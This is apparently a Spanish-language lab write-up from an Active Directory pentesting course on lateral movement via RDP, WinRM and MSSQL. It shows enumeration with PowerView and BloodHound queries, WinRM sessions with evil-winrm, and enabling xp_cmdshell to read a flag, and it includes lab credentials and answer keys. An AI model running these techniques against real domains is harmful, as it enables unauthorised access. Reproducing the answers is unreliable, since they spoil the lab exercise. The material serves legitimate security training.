Una vez obtenemos un primer acceso al dominio, el siguiente objetivo es escalar nuestra posición mediante movimiento lateral o vertical, ya sea para comprometer por completo el dominio o alcanzar algún objetivo concreto de la auditoría. Para ello, una opción común es comprometer una cuenta con privilegios de administrador local y usar Pass-the-Hash para autenticarnos por SMB.

Sin embargo, si aún no tenemos privilegios de administrador local en ningún host, existen otros métodos de movimiento lateral en entornos Windows:

- **RDP**, que permite acceso remoto con interfaz gráfica al host    
- **PowerShell Remoting (WinRM/PSRemoting)**, que nos da acceso remoto por consola para ejecutar comandos    
- **MSSQL**, donde una cuenta con permisos de `sysadmin` puede ejecutar comandos del sistema desde el contexto del servicio SQL Server    

Podemos enumerar este tipo de accesos de varias formas, siendo **BloodHound** una de las más visuales gracias a los edges como `CanRDP`, `CanPSRemote` y `SQLAdmin`. También pueden detectarse estos privilegios con herramientas como **PowerView** o incluso con utilidades integradas de Windows.

### Montando el escenario

En esta sección alternaremos entre un equipo atacante con Windows y otro con Linux para realizar los distintos ejemplos. Puedes conectarte por RDP al host Windows `MS01`, y para las partes que requieren herramientas desde Linux (como `mssqlclient.py` o `evil-winrm`), puedes abrir una consola PowerShell en `MS01` y conectarte por SSH al host Linux con las credenciales proporcionadas. Se recomienda probar todos los métodos mostrados: `Enter-PSSession` y `PowerUpSQL` desde Windows, y `evil-winrm` y `mssqlclient.py` desde Linux.

### Remote Desktop

Normalmente, si controlamos una cuenta con privilegios de administrador local en una máquina, podremos acceder a ella por RDP. Sin embargo, a veces conseguimos acceso inicial con un usuario que no es admin local, pero que sí tiene permiso para conectarse por RDP a una o varias máquinas. Este acceso puede ser muy útil, ya que nos permite lanzar nuevos ataques, escalar privilegios o extraer información sensible y credenciales del sistema. Podemos usar PowerView y su función `Get-NetLocalGroupMember` para enumerar los miembros del grupo **Remote Desktop Users** en un host determinado, como en este caso el MS01 del dominio objetivo.

```powershell
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Desktop Users
MemberName   : INLANEFREIGHT\Domain Users
SID          : S-1-5-21-3842939050-3880317879-2865463114-513
IsGroup      : True
IsDomain     : UNKNOWN
```

En este caso, todos los usuarios del dominio tienen permisos RDP sobre el host, algo común en servidores RDS o máquinas usadas como jump hosts. Estos sistemas suelen estar muy expuestos y pueden contener datos sensibles, como credenciales, o permitirnos escalar privilegios localmente para tomar el control de una cuenta con más permisos. Por eso, una de las primeras cosas que conviene revisar tras importar datos en BloodHound es si el grupo **Domain Users** tiene permisos de administrador local o de ejecución remota (como RDP o WinRM) sobre algún host del dominio.

##### Verificación de los derechos de administración local y ejecución remota del grupo Domain Users con BloodHound

![[Pasted image 20250722123518.png]]

Si comprometemos una cuenta mediante técnicas como LLMNR/NBT-NS Response Spoofing o Kerberoasting, podemos buscar ese usuario en BloodHound y revisar, en la pestaña **Node Info**, los derechos de acceso remoto que tiene asignados, ya sea de forma directa o heredada a través de pertenencia a grupos, dentro del apartado **Execution Rights**.

##### Comprobando privilegios de acceso remoto usando BloodHound

![[Pasted image 20250722123546.png]]

También podemos ir a la pestaña **Analysis** en BloodHound y ejecutar las consultas predefinidas como **Find Workstations where Domain Users can RDP** o **Find Servers where Domain Users can RDP**. Aunque existen otros métodos para enumerar esta información, BloodHound destaca por permitir identificar rápidamente este tipo de accesos, lo cual es especialmente útil durante auditorías con tiempo limitado. Además, también resulta valioso para equipos defensivos, ya que les permite auditar de forma periódica los accesos remotos y detectar configuraciones incorrectas, como que todos los Domain Users tengan acceso no intencionado a un host. Para comprobar este acceso, podemos usar herramientas como `xfreerdp`, `Remmina`, `Pwnbox` o `mstsc.exe` si atacamos desde un entorno Windows.

### WinRM

Al igual que con RDP, es posible que un usuario o grupo tenga acceso a WinRM en uno o varios hosts. Aunque este acceso sea de bajo nivel, puede servirnos para buscar datos sensibles o escalar privilegios, y en algunos casos incluso obtener acceso como administrador local. Podemos utilizar de nuevo la función `Get-NetLocalGroupMember` de PowerView para enumerar los miembros del grupo **Remote Management Users**, que existe desde Windows 8/Server 2012 y permite acceso WinRM sin necesidad de ser admin local.

##### Enumerando el grupo de administración remota de usuarios (Remote Management Users Group)

```powershell-session
PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

ComputerName : ACADEMY-EA-MS01
GroupName    : Remote Management Users
MemberName   : INLANEFREIGHT\forend
SID          : S-1-5-21-3842939050-3880317879-2865463114-5614
IsGroup      : False
IsDomain     : UNKNOWN
```

También podemos usar esta `Custom query` en BloodHound para cazar usuarios con este tipo de acceso. Esto se puede realizar pegando la query en el apartado `Raw Query`:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![[Pasted image 20250722123858.png]]

También podríamos añadir esta query personalizada a nuestra instalación de BloodHound, para que siempre la tengamos disponible:

![[Pasted image 20250722124000.png]]

También podemos usar el cmdlet [Enter-PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/enter-pssession?view=powershell-7.2) usando PowerShell desde un host Windows

```powershell-session
PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> hostname
ACADEMY-EA-MS01
[ACADEMY-EA-MS01]: PS C:\Users\forend\Documents> Exit-PSSession
PS C:\htb> 
```

Desde un host Linux, podemos usar `evil-winrm`:

```shell
$ evil-winrm -i 10.129.201.234 -u forend

Enter Password: 

Evil-WinRM shell v3.3
```

### SQL Server Admin

Es habitual encontrarse con servidores SQL en los entornos auditados, y no es raro que ciertas cuentas de usuario o servicio tengan privilegios de `sysadmin` sobre alguna instancia. Podemos obtener credenciales con este acceso mediante Kerberoasting, LLMNR/NBT-NS Response Spoofing, password spraying u otras técnicas. También es posible encontrarlas en archivos de configuración como `web.config` usando herramientas como **Snaffler**. Una vez más, **BloodHound** es muy útil para detectar este tipo de acceso, identificándolo a través del edge **SQLAdmin**, ya sea desde la pestaña **Node Info** de un usuario o mediante una consulta Cypher personalizada.

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

Aquí vemos un usuario, `damundsen`, que tiene privilegios `SQLAdmin` sobre el host `ACADEMY-EA-DB01`

![[Pasted image 20250722124422.png]]

Podemos aprovechar nuestros permisos ACL para autenticarnos como el usuario `wley`, cambiar la contraseña de `damundsen` y luego acceder al servidor SQL con herramientas como **PowerUpSQL**. Por ejemplo, si cambiamos la contraseña a `SQL1234!`, podremos autenticarnos y ejecutar comandos en el sistema. El primer paso será buscar instancias de SQL Server activas.

##### Enumerando instancias MSSQL con PowerUpSQL

```powershell-session
PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

ComputerName     : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL
Instance         : ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL,1433
DomainAccountSid : 1500000521000170152142291832437223174127203170152400
DomainAccount    : damundsen
DomainAccountCn  : Dana Amundsen
Service          : MSSQLSvc
Spn              : MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433
LastLogon        : 4/6/2022 11:59 AM
```

A partir de ahí, podemos autenticarnos en el servidor SQL remoto y ejecutar consultas personalizadas o comandos del sistema operativo. Aunque vale la pena probar la herramienta, la enumeración y explotación avanzada de MSSQL queda fuera del alcance de este módulo.

```powershell-session
PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

VERBOSE: 172.16.5.150,1433 : Connection Success.

Column1
-------
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) ...
```

También podemos autenticarnos desde nuestro Linux atacante con `impacket-mssqlclient`

```shell
$ impacket-mssqlclient INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
..SNIP...
```

Una vez conectados, podríamos habilitar `xp_cmdshell` mediante la opción `enable_xp_cmdshell`, lo que permite ejecutar comandos del sistema operativo desde la base de datos, siempre que la cuenta tenga los permisos necesarios.

```shell-session
SQL> enable_xp_cmdshell
```

Por último, podemos ejecutar comandos usando `xp_cmdshell <comando>`. Así podemos enumerar los privilegios del usuario y, si detectamos `SeImpersonatePrivilege`, podríamos escalar a SYSTEM usando herramientas como **JuicyPotato**, **PrintSpoofer** o **RoguePotato**, según el sistema objetivo. Estas técnicas se explican en el módulo de escalada de privilegios de Windows y pueden practicarse en este entorno si se desea profundizar.

##### Enumerando nuestros privilegios en el sistema con `xp_cmdshell`

```shell-session
xp_cmdshell whoami /priv
output    
```

Ahora pasemos a las preguntas:

##### _What other user in the domain has CanPSRemote rights to a host?_

> **Respuesta**: bdavis

Lo primero es recolectar el zip de información con SharpHound:

```powershell
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

Cuando haya terminado, importamos el ZIP en BloodHound GUI y ejecutamos la custom query:

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

![[Pasted image 20250722125928.png]]

##### _What host can this user access via WinRM? (just the computer name)_

> **Respuesta**: ACADEMY-EA-DC01

Lo pone en la misma captura de arriba

##### _Leverage SQLAdmin rights to authenticate to the ACADEMY-EA-DB01 host (172.16.5.150). Submit the contents of the flag at C:\Users\damundsen\Desktop\flag.txt._

_Es necesario autenticarse a **ACADEMY-EA-DB01** con `damundsen:SQL1234!`_

> **Respuesta**: 1m_the_sQl_@dm1n_n0w!

Al igual que antes, primero tenemos que conectarnos por SSH a `172.16.5.225` con las credenciales de `htb-student`:

```
PS C:\Tools> ssh htb-student@172.16.5.225
htb-student@172.16.5.225's password: HTB_@cademy_stdnt!
```

Ahora, usamos impacket o directamente el script python de `mssqlclient.py` para realizar lo siguiente:

```
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

Nos pedirá la contraseña de este usuario, que es `SQL1234!`. Entramos:

![[Pasted image 20250722133915.png]]

Y ahora aquí, ejecutamos los siguientes pasos. Primero, tenemos que habilitar `xp_cmdshell`:

```SQL
SQL> enable_xp_cmdshell
```

Y para obtener la flag:

```
SQL> xp_cmdshell type C:\Users\damundsen\Desktop\flag.txt
```

![[Pasted image 20250722134142.png]]